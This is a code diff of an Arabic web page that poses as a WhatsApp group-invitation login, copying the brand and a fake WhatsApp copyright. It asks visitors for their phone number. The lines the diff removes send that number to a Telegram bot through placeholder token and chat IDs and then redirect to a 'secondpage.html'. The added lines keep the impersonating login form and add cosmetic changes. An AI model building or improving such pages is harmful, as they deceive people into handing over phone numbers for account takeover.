@@ -8,21 +8,13 @@
     <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب. اضغط على الرابط للانضمام.">
     <meta property="og:url" content="https://your-link-to-group.com">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <title>الدعوة للانضمام إلى مجموعة واتساب</title>
     <style>
         body {
-            font-family: 'Tajawal', sans-serif;
+            font-family: Arial, sans-serif;
             background-color: #FAF3E7;
             margin: 0;
             padding: 0;
-            transition: background-color 0.3s, color 0.3s;
-        }
-
-        body.dark-mode {
-            background-color: #333;
-            color: #fff;
         }
 
         .navbar {
@@ -33,6 +25,24 @@
             padding: 10px 20px;
             color: white;
             font-size: 18px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .navbar .logo img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .navbar .language-switch {
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+            text-decoration: underline;
         }
 
         .container {
@@ -43,12 +53,6 @@
             padding: 20px;
             max-width: 400px;
             margin: 50px auto;
-            transition: background-color 0.3s, color 0.3s;
-        }
-
-        .container.dark-mode {
-            background-color: #444;
-            color: #ddd;
         }
 
         .container img {
@@ -56,14 +60,28 @@
             margin-bottom: 20px;
         }
 
-        .form-group {
+        .container .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .container .description {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .container .form-group {
             display: flex;
             flex-direction: column;
             gap: 10px;
             align-items: center;
         }
 
-        select, input, button {
+        .container select,
+        .container input {
             border: 1px solid #ddd;
             border-radius: 6px;
             padding: 10px;
@@ -72,47 +90,55 @@
             max-width: 300px;
         }
 
-        button {
+        .container button {
+            padding: 10px;
             background-color: #25D366;
             color: white;
+            border: none;
+            border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
+            width: 100%;
+            max-width: 300px;
         }
 
-        button:hover {
+        .container button:hover {
             background-color: #1DA955;
         }
 
-        footer {
+        .footer {
             text-align: center;
             margin-top: 20px;
             color: #888;
             font-size: 12px;
+            padding: 20px 0;
+            background-color: #f9f9f9;
         }
 
-        @media screen and (max-width: 600px) {
-            .container {
-                width: 90%;
-                padding: 10px;
-            }
-
-            .navbar {
-                font-size: 14px;
-            }
+        .footer .description {
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+            line-height: 1.5;
         }
     </style>
 </head>
 
 <body>
+    <!-- Navbar -->
     <div class="navbar">
-        <div>WhatsApp</div>
-        <button onclick="toggleDarkMode()">الوضع الليلي</button>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+            <span>الدعوة للانضمام إلى مجموعة واتساب</span>
+        </div>
+        <div class="language-switch" onclick="toggleLanguage()">English</div>
     </div>
 
+    <!-- Main Container -->
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        <div>تسجيل الدخول</div>
-        <div>الدعوة للانضمام إلى مجموعة واتساب.</div>
+        <div class="title">تسجيل الدخول</div>
+        <div class="description">الدعوة للانضمام إلى مجموعة واتساب.</div>
 
         <div class="form-group">
             <select id="countryCode">
@@ -131,64 +157,50 @@
             <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
         </div>
         <button onclick="sendMessage()">متابعة</button>
-        <div id="loader" style="display: none;">جاري الإرسال...</div>
-        <div id="countdown"></div>
     </div>
 
-    <footer>©️ 2024 واتساب</footer>
+    <!-- Footer -->
+    <div class="footer">
+        <div>©️ 2024 واتساب</div>
+        <div class="description">
+            WhatsApp هو تطبيق مراسلة شهير يتيح لك التواصل مع أصدقائك وعائلتك باستخدام النصوص والصور والمكالمات الصوتية والفيديو. انضم إلينا الآن!
+        </div>
+    </div>
 
     <script>
-        function toggleDarkMode() {
-            document.body.classList.toggle('dark-mode');
-            document.querySelector('.container').classList.toggle('dark-mode');
+        let currentLanguage = 'ar';
+
+        function toggleLanguage() {
+            const languageSwitch = document.querySelector('.language-switch');
+            const title = document.querySelector('.title');
+            const description = document.querySelector('.description');
+
+            if (currentLanguage === 'ar') {
+                document.body.setAttribute('dir', 'ltr');
+                title.textContent = 'Login';
+                description.textContent = 'Invite to join a WhatsApp group.';
+                languageSwitch.textContent = 'العربية';
+                currentLanguage = 'en';
+            } else {
+                document.body.setAttribute('dir', 'rtl');
+                title.textContent = 'تسجيل الدخول';
+                description.textContent = 'الدعوة للانضمام إلى مجموعة واتساب.';
+                languageSwitch.textContent = 'English';
+                currentLanguage = 'ar';
+            }
         }
 
         function sendMessage() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            const phoneRegex = /^[0-9]{6,14}$/;
-            if (!phoneRegex.test(phoneNumber)) {
-                Swal.fire({ icon: 'error', title: 'خطأ', text: 'يرجى إدخال رقم هاتف صالح.' });
+            if (!phoneNumber || phoneNumber.length < 6) {
+                alert('يرجى إدخال رقم هاتف صحيح.');
                 return;
             }
 
             const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
-            document.getElementById('loader').style.display = 'block';
-
-            fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: 'YOUR_CHAT_ID', text: `رقم الهاتف: ${fullPhoneNumber}` })
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('loader').style.display = 'none';
-                if (data.ok) {
-                    startCountdown();
-                } else {
-                    Swal.fire({ icon: 'error', title: 'خطأ', text: 'حدث خطأ أثناء الإرسال.' });
-                }
-            })
-            .catch(() => {
-                document.getElementById('loader').style.display = 'none';
-                Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل الاتصال بالخادم.' });
-            });
-        }
-
-        function startCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            let countdown = 10;
-
-            const interval = setInterval(() => {
-                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
-                countdown--;
-
-                if (countdown < 0) {
-                    clearInterval(interval);
-                    window.location.href = 'secondpage.html';
-                }
-            }, 1000);
+            alert(`تم إرسال رقم الهاتف: ${fullPhoneNumber}`);
         }
     </script>
 </body>
